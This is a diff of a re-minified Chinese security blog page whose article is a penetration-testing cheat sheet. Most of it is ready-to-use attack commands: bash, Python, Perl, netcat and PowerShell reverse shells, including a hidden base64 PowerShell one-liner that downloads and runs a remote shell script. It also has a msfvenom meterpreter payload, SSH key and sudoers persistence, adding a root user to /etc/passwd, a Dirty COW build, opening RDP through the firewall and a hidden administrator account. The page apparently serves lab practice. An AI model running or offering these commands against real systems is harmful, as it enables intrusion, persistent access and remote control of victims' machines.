@@ -1,249 +1,31 @@
-<!DOCTYPE html>
-<html lang="zh-cn">
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>渗透笔记 - P1n93r - 博学而精一</title>
-  <meta name="renderer" content="webkit" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-<meta name="theme-color" content="#f8f5ec" />
-<meta name="msapplication-navbutton-color" content="#f8f5ec">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
-
-
-<meta name="author" content="P1n93r" /><meta name="description" content="获取shell后 开启清屏： export TERM=screen # 赋值xterm也可以 查看sudo权限： sudo -l 尝试生成公钥文件到用户目录下的 .ssh 下： echo &amp;quot;xxxx&amp;quot; &amp;gt; /home/p1n93r/.ssh/authorized_keys ，然后就可以免密ssh" /><meta name="keywords" content="Security, Java, Web, Android" />
-
-
-
-
-
-
-<meta name="generator" content="Hugo 0.96.0 with theme even" />
-
-
-<link rel="canonical" href="https://p1n93r.github.io/post/security/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" />
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/manifest.json">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
-
-
-<meta property="og:title" content="渗透笔记" />
-<meta property="og:description" content="获取shell后 开启清屏： export TERM=screen # 赋值xterm也可以 查看sudo权限： sudo -l 尝试生成公钥文件到用户目录下的 .ssh 下： echo &quot;xxxx&quot; &gt; /home/p1n93r/.ssh/authorized_keys ，然后就可以免密ssh" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://p1n93r.github.io/post/security/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-01-01T21:28:36+08:00" />
-<meta property="article:modified_time" content="2021-01-01T21:28:36+08:00" />
-
-<meta itemprop="name" content="渗透笔记">
-<meta itemprop="description" content="获取shell后 开启清屏： export TERM=screen # 赋值xterm也可以 查看sudo权限： sudo -l 尝试生成公钥文件到用户目录下的 .ssh 下： echo &quot;xxxx&quot; &gt; /home/p1n93r/.ssh/authorized_keys ，然后就可以免密ssh"><meta itemprop="datePublished" content="2021-01-01T21:28:36+08:00" />
-<meta itemprop="dateModified" content="2021-01-01T21:28:36+08:00" />
-<meta itemprop="wordCount" content="1091">
-<meta itemprop="keywords" content="note," /><meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="渗透笔记"/>
-<meta name="twitter:description" content="获取shell后 开启清屏： export TERM=screen # 赋值xterm也可以 查看sudo权限： sudo -l 尝试生成公钥文件到用户目录下的 .ssh 下： echo &quot;xxxx&quot; &gt; /home/p1n93r/.ssh/authorized_keys ，然后就可以免密ssh"/>
-
-<!--[if lte IE 9]>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
-<![endif]-->
-
-<!--[if lt IE 9]>
-  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
-<![endif]-->
-
-</head>
-<body>
-  <div id="mobile-navbar" class="mobile-navbar">
-  <div class="mobile-header-logo">
-    <a href="/" class="logo">P1n93r</a>
-  </div>
-  <div class="mobile-navbar-icon">
-    <span></span>
-    <span></span>
-    <span></span>
-  </div>
-</div>
-<nav id="mobile-menu" class="mobile-menu slideout-menu">
-  <ul class="mobile-menu-list">
-    <a href="/">
-        <li class="mobile-menu-item">Home</li>
-      </a><a href="/post/">
-        <li class="mobile-menu-item">Archives</li>
-      </a><a href="/tags/">
-        <li class="mobile-menu-item">Tags</li>
-      </a><a href="/categories/">
-        <li class="mobile-menu-item">Categories</li>
-      </a><a href="/about/">
-        <li class="mobile-menu-item">About</li>
-      </a>
-  </ul>
-
-  
-
-
-</nav>
-
-  <div class="container" id="mobile-panel">
-    <header id="header" class="header">
-        <div class="logo-wrapper">
-  <a href="/" class="logo">P1n93r</a>
-</div>
-
-
-
-
-
-<nav class="site-navbar">
-  <ul id="menu" class="menu">
-    <li class="menu-item">
-        <a class="menu-item-link" href="/">Home</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/post/">Archives</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/tags/">Tags</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/categories/">Categories</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/about/">About</a>
-      </li>
-  </ul>
-</nav>
-
-    </header>
-
-    <main id="main" class="main">
-      <div class="content-wrapper">
-        <div id="content" class="content">
-          <article class="post">
-    
-    <header class="post-header">
-      <h1 class="post-title">渗透笔记</h1>
-
-      <div class="post-meta">
-        <span class="post-time"> 2021-01-01 </span>
-        <div class="post-category">
-            <a href="/categories/security/"> security </a>
-            </div>
-          <span class="more-meta"> 约 1091 字 </span>
-          <span class="more-meta"> 预计阅读 3 分钟 </span>
-        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
-      </div>
-    </header>
-
-    <div class="post-toc" id="post-toc">
-  <h2 class="post-toc-title">文章目录</h2>
-  <div class="post-toc-content always-active">
-    <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#获取shell后">获取shell后</a></li>
-        <li><a href="#常用工具">常用工具</a></li>
-        <li><a href="#反弹shell">反弹shell</a></li>
-        <li><a href="#提权">提权</a>
-          <ul>
-            <li><a href="#suid提权">SUID提权</a></li>
-            <li><a href="#工具扫描">工具扫描</a></li>
-            <li><a href="#gcc编译">gcc编译</a></li>
-          </ul>
-        </li>
-        <li><a href="#一些场景">一些场景</a>
-          <ul>
-            <li><a href="#端口敲门">端口敲门</a></li>
-            <li><a href="#利用-etcpasswd-提权">利用 <code>/etc/passwd</code> 提权</a></li>
-            <li><a href="#开启windows-rdp">开启windows rdp</a></li>
-            <li><a href="#添加简单影子用户">添加简单影子用户</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-  </div>
-</div>
-    <div class="post-content">
-      <h2 id="获取shell后">获取shell后</h2>
-<ul>
-<li>开启清屏： <code>export TERM=screen # 赋值xterm也可以</code></li>
-<li>查看sudo权限： <code>sudo -l</code></li>
-<li>尝试生成公钥文件到用户目录下的 <code>.ssh</code> 下： <code>echo &quot;xxxx&quot; &gt; /home/p1n93r/.ssh/authorized_keys</code> ，然后就可以免密ssh登录了： <code>ssh p1n93r@192.168.189.5 -i id_rsa</code></li>
-<li>创建用户且赋予root权限(已拿到root)： <code>adduser p1n93r</code> ，然后 <code>passwd p1n93r</code> ，然后赋予sudo权限 <code>echo &quot;p1n93r    ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers</code></li>
-<li>使用python获取一个完全交互式的tty： <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></li>
-<li>查看任务计划： <code>cat /etc/crontab</code></li>
-<li>查看内核版本： <code>uname -r</code></li>
-</ul>
-<h2 id="常用工具">常用工具</h2>
-<ul>
-<li>发现主机： <code>nmap -sn 192.168.189.0/24</code></li>
-<li>扫描主机： <code>nmap -A -sS -p- 192.168.189.5</code></li>
-<li>生成字典： <code>crunch 10 10 abcd -o pwd.txt</code></li>
-<li>爆破密码： <code>john --wordlist=/usr/share/wordlist/rockyou.txt encry</code></li>
-<li>Java降级编译： <code>javac -source 1.7 -target 1.7 Exploit.java</code></li>
-</ul>
-<h2 id="反弹shell">反弹shell</h2>
-<p>（1）反向连接</p>
-<p>攻击机开启监听： <code>nc -lvnp 7777</code></p>
-<p>靶机执行命令：</p>
-<pre><code>#bash反弹
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>渗透笔记 - P1n93r - 博学而精一</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="P1n93r"><meta name=description content="获取shell后 开启清屏： export TERM=screen # 赋值xterm也可以 查看sudo权限： sudo -l 尝试生成公钥文件到用户目录下的 .ssh 下： echo &amp;quot;xxxx&amp;quot; &amp;gt; /home/p1n93r/.ssh/authorized_keys ，然后就可以免密ssh"><meta name=keywords content="Security,Java,Web,Android"><meta name=generator content="Hugo 0.97.3 with theme even"><link rel=canonical href=https://p1n93r.github.io/post/security/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
+<link href=/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="渗透笔记"><meta property="og:description" content="获取shell后 开启清屏： export TERM=screen # 赋值xterm也可以 查看sudo权限： sudo -l 尝试生成公钥文件到用户目录下的 .ssh 下： echo &#34;xxxx&#34; > /home/p1n93r/.ssh/authorized_keys ，然后就可以免密ssh"><meta property="og:type" content="article"><meta property="og:url" content="https://p1n93r.github.io/post/security/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-01-01T21:28:36+08:00"><meta property="article:modified_time" content="2021-01-01T21:28:36+08:00"><meta itemprop=name content="渗透笔记"><meta itemprop=description content="获取shell后 开启清屏： export TERM=screen # 赋值xterm也可以 查看sudo权限： sudo -l 尝试生成公钥文件到用户目录下的 .ssh 下： echo &#34;xxxx&#34; > /home/p1n93r/.ssh/authorized_keys ，然后就可以免密ssh"><meta itemprop=datePublished content="2021-01-01T21:28:36+08:00"><meta itemprop=dateModified content="2021-01-01T21:28:36+08:00"><meta itemprop=wordCount content="1091"><meta itemprop=keywords content="note,"><meta name=twitter:card content="summary"><meta name=twitter:title content="渗透笔记"><meta name=twitter:description content="获取shell后 开启清屏： export TERM=screen # 赋值xterm也可以 查看sudo权限： sudo -l 尝试生成公钥文件到用户目录下的 .ssh 下： echo &#34;xxxx&#34; > /home/p1n93r/.ssh/authorized_keys ，然后就可以免密ssh"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>P1n93r</a></div><div class=mobile-navbar-icon><span></span>
+<span></span>
+<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/categories/><li class=mobile-menu-item>Categories</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>P1n93r</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/categories/>Categories</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>渗透笔记</h1><div class=post-meta><span class=post-time>2021-01-01</span><div class=post-category><a href=/categories/security/>security</a></div><span class=more-meta>约 1091 字</span>
+<span class=more-meta>预计阅读 3 分钟</span>
+<span id=busuanzi_container_page_pv class=more-meta><span id=busuanzi_value_page_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次阅读</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#获取shell后>获取shell后</a></li><li><a href=#常用工具>常用工具</a></li><li><a href=#反弹shell>反弹shell</a></li><li><a href=#提权>提权</a><ul><li><a href=#suid提权>SUID提权</a></li><li><a href=#工具扫描>工具扫描</a></li><li><a href=#gcc编译>gcc编译</a></li></ul></li><li><a href=#一些场景>一些场景</a><ul><li><a href=#端口敲门>端口敲门</a></li><li><a href=#利用-etcpasswd-提权>利用 <code>/etc/passwd</code> 提权</a></li><li><a href=#开启windows-rdp>开启windows rdp</a></li><li><a href=#添加简单影子用户>添加简单影子用户</a></li></ul></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=获取shell后>获取shell后</h2><ul><li>开启清屏： <code>export TERM=screen # 赋值xterm也可以</code></li><li>查看sudo权限： <code>sudo -l</code></li><li>尝试生成公钥文件到用户目录下的 <code>.ssh</code> 下： <code>echo "xxxx" > /home/p1n93r/.ssh/authorized_keys</code> ，然后就可以免密ssh登录了： <code>ssh p1n93r@192.168.189.5 -i id_rsa</code></li><li>创建用户且赋予root权限(已拿到root)： <code>adduser p1n93r</code> ，然后 <code>passwd p1n93r</code> ，然后赋予sudo权限 <code>echo "p1n93r ALL=(ALL:ALL) ALL" >> /etc/sudoers</code></li><li>使用python获取一个完全交互式的tty： <code>python -c 'import pty;pty.spawn("/bin/bash")'</code></li><li>查看任务计划： <code>cat /etc/crontab</code></li><li>查看内核版本： <code>uname -r</code></li></ul><h2 id=常用工具>常用工具</h2><ul><li>发现主机： <code>nmap -sn 192.168.189.0/24</code></li><li>扫描主机： <code>nmap -A -sS -p- 192.168.189.5</code></li><li>生成字典： <code>crunch 10 10 abcd -o pwd.txt</code></li><li>爆破密码： <code>john --wordlist=/usr/share/wordlist/rockyou.txt encry</code></li><li>Java降级编译： <code>javac -source 1.7 -target 1.7 Exploit.java</code></li></ul><h2 id=反弹shell>反弹shell</h2><p>（1）反向连接</p><p>攻击机开启监听： <code>nc -lvnp 7777</code></p><p>靶机执行命令：</p><pre><code>#bash反弹
 bash -i &gt;&amp; /dev/tcp/192.168.10.27/4444 0&gt;&amp;1
 #python反弹
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.10.27&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'
 #Perl反弹
 perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;)
-</code></pre>
-<p>（2）正向连接</p>
-<p>攻击机： <code>nc -lvnp 7777</code></p>
-<p>靶机： <code>nc [ip] 7777 -e /bin/bash</code></p>
-<p>（3）windows反弹shell</p>
-<p>攻击机： <code>nc -lvnp 7777</code></p>
-<p>靶机： <code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress [ip] -Port 9999&quot;</code></p>
-<p>（4）powershell base64</p>
-<pre><code>$fileContent = &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 49.234.105.98 -Port 9999&quot;
+</code></pre><p>（2）正向连接</p><p>攻击机： <code>nc -lvnp 7777</code></p><p>靶机： <code>nc [ip] 7777 -e /bin/bash</code></p><p>（3）windows反弹shell</p><p>攻击机： <code>nc -lvnp 7777</code></p><p>靶机： <code>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [ip] -Port 9999"</code></p><p>（4）powershell base64</p><pre><code>$fileContent = &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 49.234.105.98 -Port 9999&quot;
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 echo $encodedCommand
 
 # 靶机执行如下命令
 powershell -nop -noni -w hidden -exec bypass -enc [Base64Str]
-</code></pre>
-<p>（5）msfvenom生成反弹powershell并执行</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=49.xxx.xxx.xxx lport=4578 -f psh-reflection -o shell.ps1
+</code></pre><p>（5）msfvenom生成反弹powershell并执行</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=49.xxx.xxx.xxx lport=4578 -f psh-reflection -o shell.ps1
 
 // 靶机执行
 powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://49.xxx.xxx.xxx:8080/shell.ps1')&quot;
-</code></pre>
-<h2 id="提权">提权</h2>
-<h3 id="suid提权">SUID提权</h3>
-<p>以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试：</p>
-<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><h2 id=提权>提权</h2><h3 id=suid提权>SUID提权</h3><p>以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试：</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null
 find / -user root -perm -4000-print2&gt;/dev/null
 find / -user root -perm -4000-exec ls -ldb {} \;
-</code></pre>
-<h3 id="工具扫描">工具扫描</h3>
-<ul>
-<li>LinEnum：<code>https://github.com/rebootuser/LinEnum</code></li>
-<li>linuxprivchecker：<code>https://github.com/sleventyeleven/linuxprivchecker</code></li>
-</ul>
-<h3 id="gcc编译">gcc编译</h3>
-<p>例如脏牛提权，直接gcc编译会失败，提示缺少库，所以可以使用如下方式编译：</p>
-<pre><code>gcc -pthread dirty.c -o dirty -lcrypt
-</code></pre>
-<h2 id="一些场景">一些场景</h2>
-<h3 id="端口敲门">端口敲门</h3>
-<p>发现存在这个文件： <code>/etc/knockd.conf</code> 文件，就是配置了端口敲门策略，需要根据其配置来进行端口敲击才能连接响应的端口，例如如下knockd.conf配置：</p>
-<pre><code>[options]
+</code></pre><h3 id=工具扫描>工具扫描</h3><ul><li>LinEnum：<code>https://github.com/rebootuser/LinEnum</code></li><li>linuxprivchecker：<code>https://github.com/sleventyeleven/linuxprivchecker</code></li></ul><h3 id=gcc编译>gcc编译</h3><p>例如脏牛提权，直接gcc编译会失败，提示缺少库，所以可以使用如下方式编译：</p><pre><code>gcc -pthread dirty.c -o dirty -lcrypt
+</code></pre><h2 id=一些场景>一些场景</h2><h3 id=端口敲门>端口敲门</h3><p>发现存在这个文件： <code>/etc/knockd.conf</code> 文件，就是配置了端口敲门策略，需要根据其配置来进行端口敲击才能连接响应的端口，例如如下knockd.conf配置：</p><pre><code>[options]
 	UseSyslog
 
 [openSSH]
@@ -257,140 +39,29 @@ find / -user root -perm -4000-exec ls -ldb {} \;
 	seq_timeout = 25
 	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 	tcpflags    = syn
-</code></pre>
-<p>代表需要依次敲击7469、8475和9842端口，才能开放SSH服务，所以在攻击机上安装knockd工具进行敲击即可：</p>
-<pre><code>sudo apt-get install knockd
+</code></pre><p>代表需要依次敲击7469、8475和9842端口，才能开放SSH服务，所以在攻击机上安装knockd工具进行敲击即可：</p><pre><code>sudo apt-get install knockd
 knockd 192.168.189.10 7469 8475 9842
-</code></pre>
-<h3 id="利用-etcpasswd-提权">利用 <code>/etc/passwd</code> 提权</h3>
-<p>首先生成加密后的密码：</p>
-<pre><code>perl -le 'print crypt(&quot;your_password&quot;,&quot;salt&quot;)'
-</code></pre>
-<p>然后将加密后的密码和其他配置添加到 <code>/etc/passwd</code> （前提是有编辑权限咯）下：</p>
-<pre><code>echo &quot;p1n93r:xxxx:0:0:root:/root:/bin/bash&quot;
+</code></pre><h3 id=利用-etcpasswd-提权>利用 <code>/etc/passwd</code> 提权</h3><p>首先生成加密后的密码：</p><pre><code>perl -le 'print crypt(&quot;your_password&quot;,&quot;salt&quot;)'
+</code></pre><p>然后将加密后的密码和其他配置添加到 <code>/etc/passwd</code> （前提是有编辑权限咯）下：</p><pre><code>echo &quot;p1n93r:xxxx:0:0:root:/root:/bin/bash&quot;
 su p1n93r
-</code></pre>
-<h3 id="开启windows-rdp">开启windows rdp</h3>
-<ul>
-<li>设置远程桌面端口：reg add &ldquo;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&rdquo; /t REG_DWORD /v portnumber /d 3389 /f</li>
-<li>开启远程桌面：wmic RDTOGGLE WHERE ServerName=&rsquo;%COMPUTERNAME%&rsquo; call SetAllowTSConnections 1</li>
-<li>检查端口状态：netstat -an|find &ldquo;3389&rdquo;</li>
-<li>关闭远程桌面：wmic RDTOGGLE WHERE ServerName=&rsquo;%COMPUTERNAME%&rsquo; call SetAllowTSConnections 0</li>
-<li>防火墙放行3389端口：netsh advfirewall firewall add rule name=&ldquo;无所谓&rdquo; dir=in protocol=tcp localport=3389 action=allow</li>
-</ul>
-<h3 id="添加简单影子用户">添加简单影子用户</h3>
-<pre><code>net user pinger$ Pingerp1n93r /add
-net localgroup administrators pinger$ /add </code></pre>
-
-    </div>
-
-    <div class="post-copyright">
-  <p class="copyright-item">
-    <span class="item-title">文章作者</span>
-    <span class="item-content">P1n93r</span>
-  </p>
-  <p class="copyright-item">
-    <span class="item-title">上次更新</span>
-    <span class="item-content">
-        2021-01-01
-        
-    </span>
-  </p>
-  
-  
-</div>
-<footer class="post-footer">
-      <div class="post-tags">
-          <a href="/tags/note/">note</a>
-          </div>
-      <nav class="post-nav">
-        <a class="prev" href="/post/java/java%E6%B3%A8%E8%A7%A3/">
-            <i class="iconfont icon-left"></i>
-            <span class="prev-text nav-default">Java注解</span>
-            <span class="prev-text nav-mobile">上一篇</span>
-          </a>
-        <a class="next" href="/post/security/sqli-labs%E9%80%9A%E5%85%B3/">
-            <span class="next-text nav-default">sqli_labs通关</span>
-            <span class="next-text nav-mobile">下一篇</span>
-            <i class="iconfont icon-right"></i>
-          </a>
-      </nav>
-    </footer>
-  </article>
-        </div>
-        <div id="disqus_thread"></div>
-    <script type="text/javascript">
-    (function() {
-      
-      
-      if (window.location.hostname === 'localhost') return;
-
-      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-      var disqus_shortname = 'p1n93r';
-      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-  
-
-  
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="social-links">
-      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
-      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
-  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
-</div>
-
-<div class="copyright">
-  <span class="power-by">
-    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
-  </span>
-  <span class="division">|</span>
-  <span class="theme-info">
-    主题 - 
-    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
-  </span>
-
-  <div class="busuanzi-footer">
-    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
-      <span class="division">|</span>
-    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
-  </div>
-
-  <span class="copyright-year">
-    &copy; 
-    2019 - 
-    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>P1n93r</span>
-  </span>
-</div>
-
-    </footer>
-
-    <div class="back-to-top" id="back-to-top">
-      <i class="iconfont icon-up"></i>
-    </div>
-  </div>
-  
-  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
-
-
-
-<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
-
-
-
-
-
-
-
-
-</body>
-</html>
+</code></pre><h3 id=开启windows-rdp>开启windows rdp</h3><ul><li>设置远程桌面端口：reg add &ldquo;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&rdquo; /t REG_DWORD /v portnumber /d 3389 /f</li><li>开启远程桌面：wmic RDTOGGLE WHERE ServerName=&rsquo;%COMPUTERNAME%&rsquo; call SetAllowTSConnections 1</li><li>检查端口状态：netstat -an|find &ldquo;3389&rdquo;</li><li>关闭远程桌面：wmic RDTOGGLE WHERE ServerName=&rsquo;%COMPUTERNAME%&rsquo; call SetAllowTSConnections 0</li><li>防火墙放行3389端口：netsh advfirewall firewall add rule name=&ldquo;无所谓&rdquo; dir=in protocol=tcp localport=3389 action=allow</li></ul><h3 id=添加简单影子用户>添加简单影子用户</h3><pre><code>net user pinger$ Pingerp1n93r /add
+net localgroup administrators pinger$ /add </code></pre></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
+<span class=item-content>P1n93r</span></p><p class=copyright-item><span class=item-title>上次更新</span>
+<span class=item-content>2021-01-01</span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/note/>note</a></div><nav class=post-nav><a class=prev href=/post/java/java%E6%B3%A8%E8%A7%A3/><i class="iconfont icon-left"></i>
+<span class="prev-text nav-default">Java注解</span>
+<span class="prev-text nav-mobile">上一篇</span></a>
+<a class=next href=/post/security/sqli-labs%E9%80%9A%E5%85%B3/><span class="next-text nav-default">sqli_labs通关</span>
+<span class="next-text nav-mobile">下一篇</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="p1n93r",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:pin83r@gmail.com class="iconfont icon-email" title=email></a>
+<a href=https://github.com/p1n93r class="iconfont icon-github" title=github></a>
+<a href=https://p1n93r.github.io/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
+<span class=division>|</span>
+<span class=theme-info>主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>本站总访问量 <span id=busuanzi_value_site_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次</span>
+<span class=division>|</span>
